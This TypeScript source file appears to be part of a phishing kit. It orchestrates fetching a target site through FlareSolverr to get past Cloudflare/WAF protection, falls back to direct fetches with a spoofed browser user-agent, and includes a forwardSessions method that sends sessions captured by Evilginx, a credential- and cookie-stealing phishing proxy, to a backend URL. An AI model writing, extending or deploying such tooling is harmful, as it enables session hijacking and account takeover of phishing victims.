/**
 * INTEGRATION ORCHESTRATOR
 *
 * Coordinates multiple integration methods (Evilginx, FlareSolverr, Proxy, etc)
 * with intelligent fallback and retry logic.
 *
 * Integrations tried in order:
 * 1. FlareSolverr (WAF/Cloudflare bypass) - most robust, slower
 * 2. Direct fetch (if no WAF) - fastest
 * 3. Reverse proxy fallback (last resort) - middle ground
 */

import { prefetchTargetViaFlareSolverr, probeFlareSolverr } from './flaresolverr.js'
import { pollAndForwardEvilginxSessions } from './evilginx2.js'

export interface IntegrationOrchestrationOpts {
  targetUrl: string
  backendUrl: string
  outDir: string
  maxRetries?: number
  preferredMethod?: 'flaresolverr' | 'direct' | 'proxy' | 'auto'
}

export interface IntegrationResult {
  success: boolean
  method: string
  html?: string
  cookies?: string
  userAgent?: string
  error?: string
  retryCount: number
}

export interface SessionForwardingResult {
  forwarded: number
  failed: number
  error?: string
}

export class IntegrationOrchestrator {
  private targetUrl: string
  private backendUrl: string
  private outDir: string
  private maxRetries: number
  private preferredMethod: string

  constructor(opts: IntegrationOrchestrationOpts) {
    this.targetUrl = opts.targetUrl
    this.backendUrl = opts.backendUrl
    this.outDir = opts.outDir
    this.maxRetries = opts.maxRetries ?? 3
    this.preferredMethod = opts.preferredMethod ?? 'auto'
  }

  /**
   * Fetch target with intelligent integration selection
   */
  async fetch(): Promise<IntegrationResult> {
    console.error(`[orchestrator] Fetching ${this.targetUrl} with method=${this.preferredMethod}`)

    if (this.preferredMethod === 'auto') {
      return await this.fetchWithAutoFallback()
    } else if (this.preferredMethod === 'flaresolverr') {
      return await this.fetchWithFlaresolverr()
    } else if (this.preferredMethod === 'direct') {
      return await this.fetchDirect()
    } else {
      return await this.fetchWithProxy()
    }
  }

  /**
   * Auto-select best method based on site characteristics
   */
  private async fetchWithAutoFallback(): Promise<IntegrationResult> {
    // Try FlareSolverr first if available
    const flareSolverrAvailable = await probeFlareSolverr()

    if (flareSolverrAvailable) {
      console.error(`[orchestrator] FlareSolverr available, trying first...`)
      const result = await this.fetchWithFlaresolverr()
      if (result.success) return result
      console.error(`[orchestrator] FlareSolverr failed, falling back to direct fetch`)
    }

    // Try direct fetch
    const directResult = await this.fetchDirect()
    if (directResult.success) return directResult

    // Last resort: proxy
    console.error(`[orchestrator] Direct fetch failed, using proxy fallback`)
    return await this.fetchWithProxy()
  }

  /**
   * Fetch via FlareSolverr with retries
   */
  private async fetchWithFlaresolverr(): Promise<IntegrationResult> {
    let retryCount = 0
    let lastError: string | undefined

    while (retryCount <= this.maxRetries) {
      try {
        console.error(
          `[orchestrator] FlareSolverr attempt ${retryCount + 1}/${this.maxRetries + 1}...`
        )

        const result = await prefetchTargetViaFlareSolverr(this.targetUrl)

        if (result.ok && result.html) {
          console.error(`[orchestrator] ✅ FlareSolverr succeeded`)
          return {
            success: true,
            method: 'flaresolverr',
            html: result.html,
            cookies: result.cookies,
            userAgent: result.userAgent,
            retryCount,
          }
        }

        lastError = result.detail ?? 'Unknown error'
        console.error(`[orchestrator] ⚠️ FlareSolverr failed: ${lastError}`)
        retryCount++

        // Exponential backoff before retry
        if (retryCount <= this.maxRetries) {
          const delay = Math.min(1000 * Math.pow(2, retryCount - 1), 30000)
          await this.delay(delay)
        }
      } catch (error) {
        lastError = error instanceof Error ? error.message : String(error)
        console.error(`[orchestrator] ❌ FlareSolverr error: ${lastError}`)
        retryCount++

        if (retryCount <= this.maxRetries) {
          const delay = Math.min(1000 * Math.pow(2, retryCount - 1), 30000)
          await this.delay(delay)
        }
      }
    }

    return {
      success: false,
      method: 'flaresolverr',
      error: lastError ?? 'FlareSolverr failed after retries',
      retryCount,
    }
  }

  /**
   * Direct fetch with retries
   */
  private async fetchDirect(): Promise<IntegrationResult> {
    let retryCount = 0
    let lastError: string | undefined

    while (retryCount <= this.maxRetries) {
      try {
        console.error(`[orchestrator] Direct fetch attempt ${retryCount + 1}/${this.maxRetries + 1}...`)

        const response = await fetch(this.targetUrl, {
          headers: {
            'User-Agent':
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          },
          signal: AbortSignal.timeout(30000),
        })

        if (!response.ok) {
          throw new Error(`HTTP ${response.status}`)
        }

        const html = await response.text()

        if (!html || html.length === 0) {
          throw new Error('Empty response')
        }

        console.error(`[orchestrator] ✅ Direct fetch succeeded (${html.length} bytes)`)

        return {
          success: true,
          method: 'direct',
          html,
          retryCount,
        }
      } catch (error) {
        lastError = error instanceof Error ? error.message : String(error)
        console.error(`[orchestrator] ⚠️ Direct fetch failed: ${lastError}`)
        retryCount++

        if (retryCount <= this.maxRetries) {
          const delay = Math.min(1000 * Math.pow(2, retryCount - 1), 30000)
          await this.delay(delay)
        }
      }
    }

    return {
      success: false,
      method: 'direct',
      error: lastError ?? 'Direct fetch failed after retries',
      retryCount,
    }
  }

  /**
   * Proxy-based fetch (placeholder for future reverse proxy integration)
   */
  private async fetchWithProxy(): Promise<IntegrationResult> {
    console.error(`[orchestrator] Proxy fallback would be used here`)
    return {
      success: false,
      method: 'proxy',
      error: 'Proxy integration not yet implemented',
      retryCount: 0,
    }
  }

  /**
   * Forward captured sessions from Evilginx to backend
   */
  async forwardSessions(): Promise<SessionForwardingResult> {
    try {
      console.error(`[orchestrator] Forwarding Evilginx sessions...`)

      const forwarded = await pollAndForwardEvilginxSessions({
        outDir: this.outDir,
        backendUrl: this.backendUrl,
        maxRetries: this.maxRetries,
      })

      console.error(`[orchestrator] ✅ Session forwarding complete: ${forwarded} forwarded`)

      return {
        forwarded,
        failed: 0,
      }
    } catch (error) {
      const msg = error instanceof Error ? error.message : String(error)
      console.error(`[orchestrator] ❌ Session forwarding error: ${msg}`)

      return {
        forwarded: 0,
        failed: -1,
        error: msg,
      }
    }
  }

  // Helper
  private delay(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms))
  }
}

export async function createIntegrationOrchestrator(
  opts: IntegrationOrchestrationOpts
): Promise<IntegrationOrchestrator> {
  return new IntegrationOrchestrator(opts)
}
